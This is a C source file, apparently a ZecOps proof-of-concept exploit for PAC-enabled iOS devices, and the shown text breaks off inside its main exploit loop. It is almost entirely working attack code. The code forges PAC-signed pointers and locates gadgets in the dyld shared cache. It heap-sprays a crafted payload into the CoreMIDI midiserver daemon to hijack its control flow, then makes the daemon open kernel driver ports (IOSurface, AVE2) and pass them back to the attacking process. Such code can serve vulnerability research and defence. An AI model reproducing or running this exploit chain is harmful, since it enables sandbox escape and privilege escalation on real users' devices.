#if __arm64e__
//
//  [ ZecOps.com Task-For-Pwn 0 - TFP0 Submission on PAC Devices ]
//  [ Agentless, Automated, DFIR Investigations                  ]
//  [ Find Attackers' Mistakes                                   ]
//  [ For additional Task-For-Pwn-0 submissions visit https://blog.zecops.com/vulnerabilities/what-does-checkm8-mean-for-ios-dfir-and-freethesandbox/                                                  ]
//
//  Created by bb on 11/13/19.
//  Copyright © 2019 bb. All rights reserved.
//  Use on your own devices, at your own risk. Released for research purposes only. We will take no responsibility for this POC.
//

#include <stdio.h>
#include <CoreFoundation/CoreFoundation.h>
#include <dlfcn.h>
#include <mach/mach.h>
#include <sys/mman.h>
#include <setjmp.h>
#include <CoreMIDI/CoreMIDI.h>
#include <mach-o/dyld.h>
#include <ptrauth.h>
#include "IOKitLib.h"
#include <common.h>

#define TARGET_MACH_SERVICE "com.apple.midiserver"
#define TARGET_MACH_SERVICE_2 "com.apple.midiserver.io"
#define SPRAY_ADDRESS 0x29f000000

#define OF(offset) (offset)/sizeof(uint64_t)
#define exit(X) assert(false)

jmp_buf jmpb;

#pragma mark - Expose External API

extern kern_return_t bootstrap_look_up(mach_port_t bp, const char *service_name, mach_port_t *sp);

uint64_t PACSupport_pacdza(uint64_t data_ptr){
    
    const char *unused_fmt = "";
    printf(unused_fmt, data_ptr);
    __asm__ __volatile__("mov %0, x8"
                         ::"r"(data_ptr));
    __asm__ __volatile__(
                         "pacdza    x8\n"
                         "mov %0, x8\n"
                         :"=r"(data_ptr));
    return data_ptr;
}

uint64_t PACSupport_paciza(uint64_t code_ptr){
    
    const char *unused_fmt = "";
    printf(unused_fmt, code_ptr);
    __asm__ __volatile__("mov %0, x8"
                         ::"r"(code_ptr));
    __asm__ __volatile__(
                         "paciza    x8\n"
                         "mov %0, x8\n"
                         :"=r"(code_ptr));
    return code_ptr;
}

uint64_t PACSupport_pacia(uint64_t code_ptr, uint64_t modifier){
    
    __asm__ __volatile__(
                         "pacia    x0, x1\n"
                         "mov    x18, x0\n"
                         "mov    %0, x18\n"
                         :"=r"(code_ptr));
    return code_ptr;
}

uint64_t PACSupport_xpaci(void *code_ptr){
    return (uint64_t)ptrauth_strip(code_ptr, ptrauth_key_asia);
}

uint64_t PACSupport_addMask(uint64_t data_ptr, uint32_t mask){
    
    /*
     Commonly used in cooperate with "blraa"
     
     0000000190e0db00    ldraa    x9, [x8, #0x10]!
     0000000190e0db04    movk    x8, #0x165d, lsl #48
     0000000190e0db08    blraa    x9, x8
     */
    
    data_ptr |= (((uint64_t)mask) << 48);
    return data_ptr;
}

void *dylibcache_start = NULL;
size_t dylibcache_size = 0;

bool isPartOf_dyldcache(vm_address_t addr){
    vm_size_t size = 0;
    natural_t depth = 0;
    vm_region_submap_info_data_64_t info;
    mach_msg_type_number_t info_cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
    if(vm_region_recurse_64(mach_task_self(), &addr, &size, &depth, (vm_region_info_t)&info, &info_cnt))
        return false;
    if(info.share_mode == SM_TRUESHARED)
        return true;
    return false;
}

size_t Get_loaded_dylib_size(void *dylib_address){
    struct mach_header *mh = (struct mach_header*)dylib_address;
    const uint32_t cmd_count = mh->ncmds;
    struct load_command *cmds = (struct load_command*)((char*)mh+sizeof(struct mach_header_64));
    struct load_command* cmd = cmds;
    for (uint32_t i = 0; i < cmd_count; ++i){
        switch (cmd->cmd) {
            case LC_SEGMENT_64:{
                struct segment_command_64 *seg = (struct segment_command_64*)cmd;
                if(!strcmp(seg->segname,"__TEXT")){
                    return seg->vmsize;
                }
            }
                break;
        }
        cmd = (struct load_command*)((char*)cmd + cmd->cmdsize);
    }
    return 0;
}

void Find_dylibcache(){
    
    vm_address_t minAddr = 0;
    vm_address_t maxAddr = 0;
    
    for (uint32_t i = 0; i < _dyld_image_count(); i++){
        uint64_t addr = (uint64_t)_dyld_get_image_header(i);
        const char *name = _dyld_get_image_name(i);
        if(strncmp(name, "/System/", 8) && strncmp(name, "/usr/", 5))
            continue;
        if(!isPartOf_dyldcache(addr))
            continue;
        if(!minAddr || addr < minAddr)
            minAddr = addr;
        if(addr > maxAddr)
            maxAddr = addr;
    }
    
    if(!minAddr||!maxAddr){
        LOG("dylibcache Not Ready!\n");
        exit();
    }
    
    size_t last_dylib_size = Get_loaded_dylib_size((void*)maxAddr);
    
    dylibcache_start = (void*)minAddr;
    dylibcache_size = (size_t)((maxAddr + last_dylib_size) - minAddr);
    
    LOG("Dylibcache range: %p - %p\n", dylibcache_start, dylibcache_start + dylibcache_size);
}

uint64_t find_gadget(char *bytes, size_t len){
    void *addr = memmem(dylibcache_start, dylibcache_size, bytes, len);
    if(!addr){
        LOG("Gadget didn't find, len:0x%zx\n",len);
        exit();
    }
    return (uint64_t)addr;
}

// A credit to ian beer`Splitting atoms in XNU

char _bytes_doubleJump[] = {
    0x08, 0x00, 0x40, 0xF9, // ldr    x8, [x0]
    0x09, 0x3D, 0x20, 0xF8, // ldraa  x9, [x8, #0x18]!
    0x48, 0x15, 0xEE, 0xF2, // movk   x8, #0x70aa, lsl #48
    0x28, 0x09, 0x3F, 0xD7, // blraa  x9, x8
    0x08, 0x00, 0x40, 0xF9, // ldr    x8, [x0]
    0xE8, 0x3B, 0xC1, 0xDA, // autdza x8
    0x09, 0x01, 0x40, 0xF9, // ldr    x9, [x8]
    0xA8, 0x39, 0xFF, 0xF2, // movk   x8, #0xf9cd, lsl #48
    0x28, 0x09, 0x3F, 0xD7, // blraa  x9, x8
};
#define Gadget_doubleJump  find_gadget(_bytes_doubleJump,sizeof(_bytes_doubleJump))

// ldr x0, [x0] ; xpacd  x0 ; ret
#define Gadget_strip_x0  find_gadget((char[]){0x00,0x00,0x40,0xF9,0xE0,0x47,0xC1,0xDA,0xC0,0x03,0x5F,0xD6},12)

char _bytes_control_x0x2[] = {
    0xF3, 0x03, 0x00, 0xAA, // mov    x19, x0
    0x08, 0x00, 0x42, 0xA9, // ldp    x8, x0, [x0, #0x20]
    0x61, 0x3A, 0x40, 0xB9, // ldr    w1, [x19, #0x38]
    0x62, 0x1A, 0x40, 0xF9, // ldr    x2, [x19, #0x30]
    0x1F, 0x09, 0x3F, 0xD6, // blraaz x8
};
#define Gadget_control_x0x2 find_gadget(_bytes_control_x0x2,sizeof(_bytes_control_x0x2))

char _bytes_memcopy[] = {
    0x08, 0x00, 0x40, 0xB9, // ldr    w8, [x0]
    0x68, 0x00, 0x00, 0xB9, // str    w8, [x3]
    0xC0, 0x03, 0x5F, 0xD6, // ret
};
#define Gadget_memcopy find_gadget(_bytes_memcopy,sizeof(_bytes_memcopy))

#define aop_FuncCALL(FUNC, ARG1, ARG2, ARG3, ARG4) \
spraymem[OF(_aop_FuncCALL_primer_offset)] = SPRAY_ADDRESS + _aop_FuncCALL_offset; \
{char *func_call_payload = cowmem + _aop_FuncCALL_offset; \
_aop_FuncCALL_primer_offset += 8; \
_aop_FuncCALL_offset += 0x74; \
*(uint32_t*)(func_call_payload + 20) = 53; \
*(uint64_t*)(func_call_payload) = 0; \
*(uint32_t*)(func_call_payload + 8) = 0; \
char *tmp_ha = func_call_payload + 24; /* Saved an offset later gonna involves multiple time */ \
*(uint32_t*)(tmp_ha + 4) = 150; \
*(uint32_t*)(func_call_payload + 4) = 116; \
*(uint64_t*)(tmp_ha + 16) = PACSupport_paciza(PACSupport_xpaci(FUNC)); /* func ptr */ \
*(uint64_t*)(tmp_ha + 24) = ARG1; /* arg1 */ \
*(uint32_t*)(tmp_ha + 72) = ARG2; /* arg2 (Only 32bits)*/ \
*(uint64_t*)(tmp_ha + 76) = ARG3; /* arg3 */ \
*(uint64_t*)(tmp_ha + 84) = ARG4;} // arg4

#define aop_FuncCALL_memcpy_32bits(dst, src) \
aop_FuncCALL((void*)Gadget_memcopy, src, 0, 0, dst)

#define aop_Insert_String(VAR, STR) \
size_t _##VAR##_len = strlen(STR) + 1; \
uint64_t VAR = SPRAY_ADDRESS + _aop_data_offset; \
memcpy((char*)spraymem + _aop_data_offset, STR, _##VAR##_len); \
_##VAR##_len = (~0xF) & (_##VAR##_len + 0xF); \
_aop_data_offset += _##VAR##_len;

#define aop_Insert_Data(VAR, DATA, SIZE) \
size_t _##VAR##_SIZE = SIZE; \
uint64_t VAR = SPRAY_ADDRESS + _aop_data_offset; \
memcpy((char*)spraymem + _aop_data_offset, DATA, _##VAR##_SIZE); \
_##VAR##_SIZE = (~0xF) & (_##VAR##_SIZE + 0xF); \
_aop_data_offset += _##VAR##_SIZE;

#pragma mark - exp start

const char *Get_ios_kernel_path(){
    const char *ios_kernel_path = "/System/Library/Caches/com.apple.kernelcaches/kernelcache";
    return ios_kernel_path;
}

char _tempfile1_path[256] = {0};
char *Get_tempfile1_path(){
    
    if(strlen(_tempfile1_path) != 0)
        return _tempfile1_path;
    
    confstr(_CS_DARWIN_USER_TEMP_DIR, _tempfile1_path, sizeof(_tempfile1_path));
    strcat(_tempfile1_path, "12asufh");
    return _tempfile1_path;
}

uint8_t bootstrap_look_up_machmsg_bytes[244] = {0x13,0x15,0x13,0x0,0xf4,0x0,0x0,0x0,0x7,0x7,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x10,0x43,0x50,0x58,0x40,0x5,0x0,0x0,0x0,0x0,0xf0,0x0,0x0,0xcc,0x0,0x0,0x0,0x8,0x0,0x0,0x0,0x73,0x75,0x62,0x73,0x79,0x73,0x74,0x65,0x6d,0x0,0x0,0x0,0x0,0x40,0x0,0x0,0x5,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x68,0x61,0x6e,0x64,0x6c,0x65,0x0,0x0,0x0,0x40,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x69,0x6e,0x73,0x74,0x61,0x6e,0x63,0x65,0x0,0x0,0x0,0x0,0x0,0xa0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x72,0x6f,0x75,0x74,0x69,0x6e,0x65,0x0,0x0,0x40,0x0,0x0,0xcf,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x66,0x6c,0x61,0x67,0x73,0x0,0x0,0x0,0x0,0x40,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x6e,0x61,0x6d,0x65,0x0,0x0,0x0,0x0,0x0,0x90,0x0,0x0,0x18,0x0,0x0,0x0,0x63,0x6f,0x6d,0x2e,0x61,0x70,0x70,0x6c,0x65,0x2e,0x6d,0x69,0x64,0x69,0x73,0x65,0x72,0x76,0x65,0x72,0x2e,0x69,0x6f,0x0,0x74,0x79,0x70,0x65,0x0,0x0,0x0,0x0,0x0,0x40,0x0,0x0,0x7,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x74,0x61,0x72,0x67,0x65,0x74,0x70,0x69,0x64,0x0,0x0,0x0,0x0,0x30,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0};

uint8_t vm_read_overwrite_machmsg_bytes[56] = {0x13,0x15,0x0,0x0,0x38,0x0,0x0,0x0,0x11,0x11,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0xc8,0x12,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x22,0x22,0x22,0x22,0x22,0x22,0x22,0x22,0x33,0x33,0x33,0x33,0x0,0x0,0x0,0x0,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44};

uint32_t cowmemlen = 0x4000; // Aligned to PAGE_SIZE, for efficiency
int cow_fd = -1;
void Prepare_cow_file_wAOP(){
    void *cowmem = malloc(cowmemlen);
    bzero(cowmem, cowmemlen);
    
    uint64_t *spraymem = cowmem;
    
    // --- Initial PC hijacking
    spraymem[OF(0x10)] = PACSupport_pacia(Gadget_doubleJump, PACSupport_addMask(SPRAY_ADDRESS + 0x10, 0x165d)); // Next jmp
    
    // --- Execute doubleJump gadget
    spraymem[OF(0x18)] = PACSupport_pacia(Gadget_strip_x0, PACSupport_addMask(SPRAY_ADDRESS + 0x18, 0x70aa));
    spraymem[OF(0x0)] = PACSupport_pacdza(SPRAY_ADDRESS + 0x8);
    spraymem[OF(0x8)] = PACSupport_pacia(Gadget_control_x0x2, PACSupport_addMask(SPRAY_ADDRESS + 0x8, 0xf9cd)); // Next jmp
    
    // --- Execute control_x0x2 gadget
    spraymem[OF(0x20)] = PACSupport_paciza(PACSupport_xpaci(dlsym((void*)-2, "xpc_array_apply_f"))); // Next jmp
    spraymem[OF(0x28)] = SPRAY_ADDRESS +0x40 - 24; // Reset x0, point to our spray mem, explicitly, a crafted xpc array
    spraymem[OF(0x30)] = (uint64_t)IODispatchCalloutFromMessage; // Reset x2
    spraymem[OF(0x38)] = 0x0; // Reset w1

    uint32_t _aop_FuncCALL_primer_offset = 0x3F00;
    uint32_t _aop_FuncCALL_offset = 0x2000;
    
    uint32_t _aop_data_offset = 0x1000;
    
    spraymem[OF(0x40)] = -1; // Array count, -1 causes the array to iterate endlessly
    spraymem[OF(0x48)] = SPRAY_ADDRESS + _aop_FuncCALL_primer_offset; // Array internal pointer, point to stored objects pool
    
    aop_Insert_Data(lookup_io_server_rawmsg, bootstrap_look_up_machmsg_bytes, sizeof(bootstrap_look_up_machmsg_bytes));
    aop_Insert_Data(vm_read_overwrite_rawmsg, vm_read_overwrite_machmsg_bytes, sizeof(vm_read_overwrite_machmsg_bytes));
    
    struct {
        mach_msg_header_t Head;
        // Head.msgh_local_port: +12
        mach_msg_body_t msgh_body;
        mach_msg_port_descriptor_t our_recv_port;
        // our_recv_port.name: +28
        mach_msg_port_descriptor_t our_task_port;
        // our_task_port.name: +40
        mach_msg_port_descriptor_t AppleSPUProfileDriver_servport;
        // AppleSPUProfileDriver_servport.name: +52
        mach_msg_port_descriptor_t IOSurfaceRoot_servport;
        // IOSurfaceRoot_servport.name: +64
        mach_msg_port_descriptor_t AppleAVE2Driver_servport;
        // AppleAVE2Driver_servport.name: +76
        mach_msg_trailer_t trailer;
    }_remote_recvmsg = {0}; // Size: 96
    _remote_recvmsg.Head.msgh_size = sizeof(_remote_recvmsg);
    
    struct {
        mach_msg_header_t Head;
        // Head.msgh_local_port: +12
        uint64_t our_data_addr;
        // our_data_addr: +24
        uint64_t our_data_len;
        // our_data_len: +32
        uint64_t remote_map_addr;
        // remote_map_addr: +40
        mach_msg_trailer_t trailer;
    }_remote_recvmsg2 = {0}; // Size: 56
    _remote_recvmsg2.Head.msgh_size = sizeof(_remote_recvmsg2);
    
    struct {
        mach_msg_header_t Head;
        // Head.msgh_remote_port +8
        mach_msg_body_t msgh_body;
        mach_msg_port_descriptor_t port_send_to_us;
        // port_send_to_us.name +28
    }_remote_sendmsg = {0};
    _remote_sendmsg.Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    _remote_sendmsg.Head.msgh_size = sizeof(_remote_sendmsg);
    _remote_sendmsg.msgh_body.msgh_descriptor_count = 1;
    _remote_sendmsg.port_send_to_us.name = mach_task_self();
    _remote_sendmsg.port_send_to_us.disposition = MACH_MSG_TYPE_MOVE_SEND;
    _remote_sendmsg.port_send_to_us.type = MACH_MSG_PORT_DESCRIPTOR;
    
    struct {
        mach_msg_header_t Head;
    }_remote_sendmsg2 = {0};
    _remote_sendmsg2.Head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    _remote_sendmsg2.Head.msgh_size = sizeof(_remote_sendmsg2);
    
    aop_Insert_Data(remote_recvmsg, &_remote_recvmsg, sizeof(_remote_recvmsg));
    aop_Insert_Data(remote_recvmsg2, &_remote_recvmsg2, sizeof(_remote_recvmsg2));
    aop_Insert_Data(remote_sendmsg, &_remote_sendmsg, sizeof(_remote_sendmsg));
    aop_Insert_Data(remote_sendmsg2, &_remote_sendmsg2, sizeof(_remote_sendmsg2));
    
    aop_FuncCALL(mach_port_allocate, mach_task_self(), MACH_PORT_RIGHT_RECEIVE, lookup_io_server_rawmsg + offsetof(mach_msg_header_t, msgh_local_port), 0);
    aop_FuncCALL(mach_msg_send, lookup_io_server_rawmsg, 0, 0, 0);
    aop_FuncCALL(mach_msg_receive, lookup_io_server_rawmsg, 0, 0, 0);
    
    aop_FuncCALL_memcpy_32bits(remote_recvmsg + offsetof(mach_msg_header_t, msgh_local_port), lookup_io_server_rawmsg + 28);
    aop_FuncCALL(mach_msg_receive, remote_recvmsg, 0, 0, 0);
    aop_FuncCALL_memcpy_32bits(remote_recvmsg2+12, remote_recvmsg+12);
    aop_FuncCALL_memcpy_32bits(remote_sendmsg+8, remote_recvmsg+28);
    aop_FuncCALL_memcpy_32bits(remote_sendmsg2+8, remote_recvmsg+28);
    
    // Opening and passing kernel driver ports to us.
    aop_FuncCALL_memcpy_32bits(SPRAY_ADDRESS + _aop_FuncCALL_offset + 24 + 24, remote_recvmsg+52);
    aop_FuncCALL(dlsym((void*)-2, "IOServiceOpen"), 0x414141, mach_task_self(), 0, remote_sendmsg+28);
    aop_FuncCALL(mach_msg_send, remote_sendmsg, 0, 0, 0);
    
    aop_FuncCALL_memcpy_32bits(SPRAY_ADDRESS + _aop_FuncCALL_offset + 24 + 24, remote_recvmsg+64);
    aop_FuncCALL(dlsym((void*)-2, "IOServiceOpen"), 0x414141, mach_task_self(), 0, remote_sendmsg+28);
    aop_FuncCALL(mach_msg_send, remote_sendmsg, 0, 0, 0);
    
    aop_FuncCALL_memcpy_32bits(SPRAY_ADDRESS + _aop_FuncCALL_offset + 24 + 24, remote_recvmsg+76);
    aop_FuncCALL(dlsym((void*)-2, "IOServiceOpen"), 0x414141, mach_task_self(), 0, remote_sendmsg+28);
    aop_FuncCALL(mach_msg_send, remote_sendmsg, 0, 0, 0);
    
    // Waiting for overwriting over the iosurface mapping memory, key to trigger vulnerability in kernel
    aop_FuncCALL(mach_msg_receive, remote_recvmsg2, 0, 0, 0);
    
    aop_FuncCALL_memcpy_32bits(vm_read_overwrite_rawmsg + 0x8, remote_recvmsg+40);
    aop_FuncCALL_memcpy_32bits(vm_read_overwrite_rawmsg + 0x20, remote_recvmsg2+24);
    aop_FuncCALL_memcpy_32bits(vm_read_overwrite_rawmsg + 0x24, remote_recvmsg2+28);
    aop_FuncCALL_memcpy_32bits(vm_read_overwrite_rawmsg + 0x28, remote_recvmsg2+32);
    aop_FuncCALL_memcpy_32bits(vm_read_overwrite_rawmsg + 0x2C, remote_recvmsg2+36);
    aop_FuncCALL_memcpy_32bits(vm_read_overwrite_rawmsg + 0x30, remote_recvmsg2+40);
    aop_FuncCALL_memcpy_32bits(vm_read_overwrite_rawmsg + 0x34, remote_recvmsg2+44);
    aop_FuncCALL(mach_msg_send, vm_read_overwrite_rawmsg, 0, 0, 0);
    
    // Notify us if copy process completed
    aop_FuncCALL(mach_msg_send, remote_sendmsg2, 0, 0, 0);
    
    // Block here to waiting for finish exploitation
    aop_FuncCALL(mach_msg_receive, remote_recvmsg2, 0, 0, 0);
    
    // Duty completed
    aop_FuncCALL(exit, 0, 0, 0, 0);
    
    // -- - -- End of AOP Payload
    
    for(unsigned long i=PAGE_SIZE; i<cowmemlen; i=i+PAGE_SIZE){
        memcpy(cowmem + i, cowmem, PAGE_SIZE);
    }
    
    char *cow_fpath = Get_tempfile1_path();
    
    remove(cow_fpath);
    FILE *cow_fp = fopen(cow_fpath, "wb");
    fwrite(cowmem, 1, cowmemlen, cow_fp);
    fclose(cow_fp);
    free(cowmem);
    
    cow_fd = open(cow_fpath, O_RDONLY);
}

mach_vm_address_t mapEnd = 0;
void Map_file_intoMem(){
    //Use COW + Mapping technique to distribute large scale continuous memory
    
    mach_vm_address_t iteration = SPRAY_ADDRESS;
    mach_vm_address_t mapBegin = iteration;
    
    for(int i=0;; i++){
        if(mmap((void*)iteration, cowmemlen, PROT_READ, MAP_FIXED|MAP_SHARED, cow_fd, 0) == (void*)-1)
            break;
        mapEnd = iteration += cowmemlen;
        if(mapEnd == 0x2d8000000){
            break;
        }
    }
    
    if(mapEnd == 0){
        LOG("Map file into mem error!\n");
    }
    
    LOG("Mapping range: 0x%llx - 0x%llx\n", mapBegin, mapEnd);
}

#pragma mark - Pre-exploitation - Our Mach Server

mach_port_t our_serverport = 0;
void Prepare_our_Mach_server(){
    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &our_serverport);
    if(our_serverport == 0){
        LOG("Error occurred when mach_port_allocate: 0x%x!\n", kr);
        exit();
    }
}

#pragma mark - Exploitation - Common

mach_port_t midi_bsport = 0;
mach_port_t midiIo_bsport = 0;

mach_port_t Retrieve_midi_port(){
    if(midi_bsport)
        return midi_bsport;
    bootstrap_look_up(bootstrap_port, TARGET_MACH_SERVICE, &midi_bsport);
    if(!midi_bsport){
        LOG("%s bootstrap_look_up failed\n", TARGET_MACH_SERVICE);
        exit(1);
    }
    return midi_bsport;
}

mach_port_t Retrieve_midiIo_port(){
    if(midiIo_bsport)
        return midiIo_bsport;
    bootstrap_look_up(bootstrap_port, TARGET_MACH_SERVICE_2, &midiIo_bsport);
    if(midiIo_bsport == 0){
        LOG("%s bootstrap_look_up failed\n", TARGET_MACH_SERVICE_2);
        exit(1);
    }
    return midiIo_bsport;
}

void useless_notify(const MIDINotification *message, void * __nullable refCon){
}

CFStringRef bunchkeys[300];
void Prepare_bunch_keys(){
    char _str[10];
    for(int i=0; i<sizeof(bunchkeys)/sizeof(bunchkeys[0]); i++){
        snprintf(_str, sizeof(_str), "A%d", i);
        bunchkeys[i] = CFStringCreateWithCString(kCFAllocatorDefault, _str, kCFStringEncodingASCII);
    }
}

#pragma mark - Exploitation - Initial Mach Messages

struct MIGSender_spray{
    mach_msg_header_t Head;
    mach_msg_body_t msgh_body;
    mach_msg_ool_descriptor_t ool;
};
struct MIGSender_spray *sprayMsg = NULL;
void Send_spray_mem(){
    if(sprayMsg == NULL){
        sprayMsg = malloc(sizeof(*sprayMsg));
        sprayMsg->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND);
        sprayMsg->Head.msgh_size = sizeof(*sprayMsg);
        sprayMsg->Head.msgh_remote_port = Retrieve_midiIo_port();
        sprayMsg->Head.msgh_local_port = MACH_PORT_NULL;
        sprayMsg->Head.msgh_voucher_port = MACH_PORT_NULL;
        sprayMsg->Head.msgh_id = 0;
        sprayMsg->msgh_body.msgh_descriptor_count = 1;
        
        sprayMsg->ool.address = (void*)SPRAY_ADDRESS;
        sprayMsg->ool.size = (mach_msg_size_t)(mapEnd - SPRAY_ADDRESS);
        sprayMsg->ool.deallocate = false;
        sprayMsg->ool.copy = MACH_MSG_VIRTUAL_COPY;
        sprayMsg->ool.type = MACH_MSG_OOL_DESCRIPTOR;
    }
    
    mach_msg(&sprayMsg->Head, MACH_SEND_MSG, sprayMsg->Head.msgh_size, 0, 0, 0, 0);
}

struct MIGSender_trigger{
    mach_msg_header_t Head;
    char pad[4];
    int input_cmd;
    int opaID_len;
    uint32_t opaID;
};
struct MIGSender_trigger *triggerExpMsg;
void Init_triggerExp_msg(uint32_t opaID){
    triggerExpMsg = calloc(1, sizeof(*triggerExpMsg));
    
    triggerExpMsg->Head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND);
    triggerExpMsg->Head.msgh_size = sizeof(*triggerExpMsg);
    triggerExpMsg->Head.msgh_remote_port = Retrieve_midiIo_port();
    triggerExpMsg->Head.msgh_local_port = MACH_PORT_NULL;
    triggerExpMsg->Head.msgh_voucher_port = MACH_PORT_NULL;
    triggerExpMsg->Head.msgh_id = 0;
    triggerExpMsg->input_cmd = 2;
    triggerExpMsg->opaID_len = 4;
    triggerExpMsg->opaID = opaID;
}

void Send_triggerExp_msg(){
    int mrr = mach_msg(&triggerExpMsg->Head, MACH_SEND_MSG, triggerExpMsg->Head.msgh_size, 0, 0, 0, 0);
    if(mrr){
        LOG("Error occurred when sending out triggerExpMsg: 0x%x!\n", mrr);
    }
}

void Send_overwritting_iosurfaceMap(uint64_t our_data_addr, uint64_t our_data_len, uint64_t remote_map_addr){
    
    struct {
        mach_msg_header_t Head;
        uint64_t our_data_addr;
        uint64_t our_data_len;
        uint64_t remote_map_addr;
    }msg = {0};
    
    msg.Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    msg.Head.msgh_size = sizeof(msg);
    msg.Head.msgh_remote_port = Retrieve_midiIo_port();
    msg.our_data_addr = our_data_addr;
    msg.our_data_len = our_data_len;
    msg.remote_map_addr = remote_map_addr;
    
    mach_msg(&msg.Head, MACH_SEND_MSG, msg.Head.msgh_size, 0, 0, 0, 0);
}

void Send_our_serverport(){
    struct {
        mach_msg_header_t Head;
        mach_msg_body_t msgh_body;
        mach_msg_port_descriptor_t our_recv_port;
        mach_msg_port_descriptor_t our_task_port;
        mach_msg_port_descriptor_t AppleSPUProfileDriver_servport;
        mach_msg_port_descriptor_t IOSurfaceRoot_servport;
        mach_msg_port_descriptor_t AppleAVE2Driver_servport;
    }msg = {0};
    
    msg.Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    msg.Head.msgh_size = sizeof(msg);
    msg.Head.msgh_remote_port = Retrieve_midiIo_port();
    msg.msgh_body.msgh_descriptor_count = 5;
    msg.our_recv_port.name = our_serverport;
    msg.our_recv_port.disposition = MACH_MSG_TYPE_MAKE_SEND;
    msg.our_recv_port.type = MACH_MSG_PORT_DESCRIPTOR;
    msg.our_task_port.name = mach_task_self();
    msg.our_task_port.disposition = MACH_MSG_TYPE_COPY_SEND;
    msg.our_task_port.type = MACH_MSG_PORT_DESCRIPTOR;
    
    extern CFMutableDictionaryRef
    IOServiceMatching(
                      const char *    name ) CF_RETURNS_RETAINED;
    extern io_service_t
    IOServiceGetMatchingService(
                                mach_port_t    masterPort,
                                CFDictionaryRef    matching CF_RELEASES_ARGUMENT);
    
    msg.AppleSPUProfileDriver_servport.name = IOServiceGetMatchingService(0, IOServiceMatching("AppleSPUProfileDriver"));
    msg.AppleSPUProfileDriver_servport.disposition = MACH_MSG_TYPE_COPY_SEND;
    msg.AppleSPUProfileDriver_servport.type = MACH_MSG_PORT_DESCRIPTOR;
    
    msg.IOSurfaceRoot_servport.name = IOServiceGetMatchingService(0, IOServiceMatching("IOSurfaceRoot"));
    msg.IOSurfaceRoot_servport.disposition = MACH_MSG_TYPE_COPY_SEND;
    msg.IOSurfaceRoot_servport.type = MACH_MSG_PORT_DESCRIPTOR;
    
    msg.AppleAVE2Driver_servport.name = IOServiceGetMatchingService(0, IOServiceMatching("AppleAVE2Driver"));
    msg.AppleAVE2Driver_servport.disposition = MACH_MSG_TYPE_COPY_SEND;
    msg.AppleAVE2Driver_servport.type = MACH_MSG_PORT_DESCRIPTOR;
    
    mach_msg(&msg.Head, MACH_SEND_MSG, msg.Head.msgh_size, 0, 0, 0, 0);
}

void Send_exit_msg(){
    struct {
        mach_msg_header_t Head;
    }msg = {0};
    msg.Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    msg.Head.msgh_size = sizeof(msg);
    msg.Head.msgh_remote_port = Retrieve_midiIo_port();
    
    mach_msg(&msg.Head, MACH_SEND_MSG, msg.Head.msgh_size, 0, 0, 0, 0);
}

mach_port_t Reply_ioservice_handler(){
    struct {
        mach_msg_header_t Head;
        mach_msg_body_t msgh_body;
        mach_msg_port_descriptor_t port;
        mach_msg_trailer_t trailer;
    }msg = {0};
    msg.Head.msgh_size = sizeof(msg);
    msg.Head.msgh_local_port = our_serverport;
    int mrr = mach_msg_receive(&msg.Head);
    
    if(mrr != 0){
        LOG("Error occurred when Reply_ioservice_handler(0x%x)\n", mrr);
        return 0;
    }
    return msg.port.name;
}

void Reply_notify_completion(){
    struct {
        mach_msg_header_t Head;
        mach_msg_trailer_t trailer;
    }msg = {0};
    msg.Head.msgh_size = sizeof(msg);
    msg.Head.msgh_local_port = our_serverport;
    mach_msg_receive(&msg.Head);
}

void exp_start(){
    
    Find_dylibcache();
    
    dlopen("/System/Library/Frameworks/CoreMIDI.framework/CoreMIDI", RTLD_NOW);
    dlopen("/System/Library/Frameworks/IOKit.framework/Versions/A/IOKit", RTLD_NOW);
    
    Prepare_our_Mach_server();
    LOG("Our Mach Server Ready! 0x%x\n", our_serverport);
    
    Prepare_cow_file_wAOP();
    Map_file_intoMem();
    
    Prepare_bunch_keys(); // For iterating
    size_t spraybufsize = 0x90;
    void *spraybuf = malloc(spraybufsize);
    for(int i=0; i<spraybufsize; i+=0x8){
        *(uint64_t*)(spraybuf + i) = PACSupport_pacdza(SPRAY_ADDRESS);
    }
    CFDataRef spraydata = CFDataCreate(kCFAllocatorDefault, spraybuf, spraybufsize);
    
    while(1){
        uint32_t mclient_id = 0;
        MIDIClientCreate(CFSTR(""), useless_notify, NULL, &mclient_id);
        LOG("MIDI Client ID: 0x%x\n", mclient_id);
        
        uint32_t mdevice_id = 0;
        MIDIExternalDeviceCreate(CFSTR(""), CFSTR(""), CFSTR(""), &mdevice_id);
        LOG("MIDI Device ID: 0x%x\n", mdevice_id);
        
        for(int i=0; i<300; i++){
            MIDIObjectSetDataProperty(mdevice_id, bunchkeys[i], spraydata);
        }
        
        Send_spray_mem();
        Send_spray_mem();
        
